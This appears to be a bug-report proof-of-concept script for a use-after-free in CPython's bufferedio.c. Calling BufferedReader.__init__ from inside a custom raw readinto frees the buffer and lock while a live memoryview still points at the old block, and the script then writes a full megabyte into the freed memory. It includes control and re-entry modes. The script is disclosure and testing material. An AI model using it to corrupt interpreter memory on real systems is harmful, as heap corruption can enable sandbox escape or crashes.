"""bufferedio.c: BufferedReader.__init__ frees self->buffer with no ENTER_BUFFERED,
while _bufferedreader_raw_read has a live memoryview over that same block.

Modules/_io/bufferedio.c:1623 _bufferedreader_raw_read
    PyBuffer_FillInfo(&buf, NULL, start, len, 0, PyBUF_CONTIG);   /* start = self->buffer + k */
    memobj = PyMemoryView_FromBuffer(&buf);
    res = PyObject_CallMethodOneArg(self->raw, &_Py_ID(readinto), memobj);   /* user Python */

Modules/_io/bufferedio.c:837 _buffered_init
    if (self->buffer)
        PyMem_Free(self->buffer);          <-- :847
    self->buffer = PyMem_Malloc(self->buffer_size);
    ...
    if (self->lock)
        PyThread_free_lock(self->lock);    <-- :854, freed WHILE the caller holds it
    self->lock = PyThread_allocate_lock();

Every ENTER_BUFFERED-protected method is safe against re-entrancy: a second
entry from the same thread hits _enter_buffered_busy's
"reentrant call inside %R" branch (bufferedio.c:300).  __init__ is NOT one of
the 12 ENTER_BUFFERED sites (:561 :583 :943 :968 :1008 :1017 :1059 :1115 :1236
:1429 :1476 :2097), so it walks straight into the region and frees the block
the outer frame handed to the user as a writable memoryview.

Guarded twin: _io__Buffered_close_impl (bufferedio.c:583-607) performs the very
same PyMem_Free(self->buffer) (:594) but does it INSIDE an ENTER_BUFFERED region,
so a re-entrant close is rejected instead of corrupting the heap.

Usage: <python> bufferedio_reinit_buffer_uaf.py [mode]
  mode=probe    (default) re-init from inside raw.readinto  -> UAF write
  mode=control  identical shape, no re-init                  -> must be clean
  mode=reentry  prove ENTER_BUFFERED does reject a re-entrant read()
"""
import sys

MODE = sys.argv[1] if len(sys.argv) > 1 else "probe"

import io

BIG = 1 << 20   # first buffer: 1 MiB, allocated by PyMem_Malloc
SMALL = 64      # re-init buffer: 64 B, cannot cover the old block


class Dummy(io.RawIOBase):
    def readable(self):
        return True

    def readinto(self, b):
        return 0


class Evil(io.RawIOBase):
    def readable(self):
        return True

    def readinto(self, b):
        # `b` is a memoryview over br->buffer + 0, len == BIG.
        n = len(b)
        print("  in readinto, view len =", n)
        sys.stdout.flush()
        if MODE == "probe":
            # No ENTER_BUFFERED on __init__ -> PyMem_Free(self->buffer)
            # and PyThread_free_lock(self->lock) run right here.
            br.__init__(Dummy(), buffer_size=SMALL)
            print("  re-init done; br->buffer freed and shrunk to", SMALL)
            sys.stdout.flush()
        elif MODE == "reentry":
            try:
                br.read(1)
                print("  re-entrant read() SUCCEEDED (no guard)")
            except RuntimeError as e:
                print("  re-entrant read() rejected:", e)
            sys.stdout.flush()
            return 0
        # write the whole view -- into the freed block when MODE == probe
        b[0:n] = b"X" * n
        return n


br = io.BufferedReader(Evil(), buffer_size=BIG)
print("peek() ->", end=" ")
sys.stdout.flush()
r = br.peek()
print(len(r), "bytes")
print("survived; br.read(4) =", br.read(4))
